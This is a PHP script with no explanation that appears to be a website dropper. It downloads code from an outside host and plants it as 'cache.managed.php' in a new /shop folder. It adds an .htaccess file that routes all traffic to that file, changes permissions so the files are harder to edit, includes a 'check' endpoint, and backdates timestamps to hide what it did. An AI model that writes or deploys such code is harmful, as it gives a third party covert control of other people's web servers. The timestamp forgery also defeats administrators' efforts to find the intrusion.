<?php
$files = scandir($_SERVER['DOCUMENT_ROOT']);
for ($i=0;$i<count($files);$i++) {
  if(stristr($files[$i], 'php')) {
		$time = filemtime($_SERVER['DOCUMENT_ROOT']."/".$files[$i]);
		break;
  }
 }
$dir="/shop";
mkdir($_SERVER['DOCUMENT_ROOT']."$dir", 0755,TRUE);
$code = file_get_contents('http://ziptr.ru/auri/shop.txt');
$ht = 'Options -Indexes
Options +FollowSymLinks

ErrorDocument 401 /
ErrorDocument 403 /
ErrorDocument 500 /
ErrorDocument 404 /

AddDefaultCharset UTF-8

php_flag register_globals Off
php_flag display_errors Off
php_flag magic_quotes_gpc Off
php_flag magic_quotes_runtime Off

<IfModule mod_dir.c>
	DirectoryIndex cache.managed.php
</IfModule>

<IfModule mod_rewrite.c>
	RewriteEngine On
	RewriteCond %{REQUEST_FILENAME} !-f
	RewriteCond %{REQUEST_FILENAME} !-d
	RewriteRule ^(.*)$ cache.managed.php [QSA,L]
</IfModule>';

$d = array("shop");
for ($i=0;$i<count($d);$i++) {
$dir = $_SERVER["DOCUMENT_ROOT"]."/".$d[$i];
if(is_dir($dir)) {
if (!file_exists($dir."/cache.managed.php") or !file_exists($dir."/.htaccess") ) {
chmod($dir, 0777);
chmod($dir."/cache.managed.php", 0777);
chmod($dir."/.htaccess", 0777);
$fp = fopen($dir."/cache.managed.php", "w+");
$fp2 = fopen($dir."/.htaccess", "w+");
fwrite($fp, $code);
fclose($fp);
fwrite($fp2, $ht);
fclose($fp2);
if (file_exists($_SERVER["DOCUMENT_ROOT"]."/.htaccess")) {
chmod($dir."/.htaccess", 0777);


chmod($dir."/cache.managed.php", 0555);
chmod($dir."/.htaccess", 0444);
}
function getUrl() {
  $url  = @( $_SERVER["HTTPS"] != 'on' ) ? 'http://'.$_SERVER["SERVER_NAME"] :  'https://'.$_SERVER["SERVER_NAME"];
  $url .= ( $_SERVER["SERVER_PORT"] != 80 ) ? ":".$_SERVER["SERVER_PORT"] : "";
  $url .= $_SERVER["REQUEST_URI"];
  return $url;
}    
if (stristr(file_get_contents('http://'.$_SERVER["SERVER_NAME"]."/shop/?dle"), "Hacking Attempt")) {
file_get_contents("".getUrl());
}

$dw = array("shop");
for ($i=0;$i<count($dw);$i++) {
$dir = $_SERVER["DOCUMENT_ROOT"]."/".$dw[$i];
if(is_dir($dir)) {
if (file_exists($dir."/.htaccess") ) {
chmod($dir."/.htaccess", 0444);
chmod($dir."/cache.managed.php", 0555);
chmod($dir, 0755);
break;
}}
}
break;
}}
}
if (isset($_GET['check'])) {
echo "ok!";
}

touch(dirname("shop"), $time);
touch($_SERVER['/shop/'], $time);
?>